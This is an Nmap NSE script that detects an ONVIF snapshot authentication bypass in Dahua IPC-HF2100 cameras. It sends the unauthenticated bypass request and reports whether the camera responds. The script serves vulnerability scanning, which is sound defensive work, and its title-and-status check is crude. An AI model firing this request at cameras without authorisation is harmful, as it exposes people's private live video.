local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local shortport = require "shortport"


description = [[
大华摄像头 IPC-HF2100 2.420.0000.0.R onvif 协议身份认证漏洞，
攻击者通过onvif协议的snapshot接口绕过身份认证，直接获得摄像头实时视频图像。
]]

author = "seaung"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "dahua", "dahua_unauth_02", "vuln_detect" }

portrule = shortport.port_or_service( {80, 443, 8080, 8090, 8088}, {"http", "https"}, "tcp", "open")

action = function(host, port)
	local path = "/*/onvifsnapshot/*/"
	local output = stdnse.output_table()
	local options = {header={}}
	options["header"]["Connection"] = "close"
	options["header"]["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
	options["header"]["Accept"] = "*/*"
	options["header"]["X-Requestd-With"] = "XMLHttpRequest"
	options["header"]["X-Request"] = "JSON"
	options["header"]["User-Agent"] = "DAHUA-dhdev/1.0"


 	resp = http.get(host, port, path, options, {no_cache = true})
	body = resp.body

	if resp.status == 200 and string.match(body, "<title>") and not string.match(body, "404") then
		output = "Found vulnerable."
	else
		output = "Not vulnerable."
	end
	return output
end

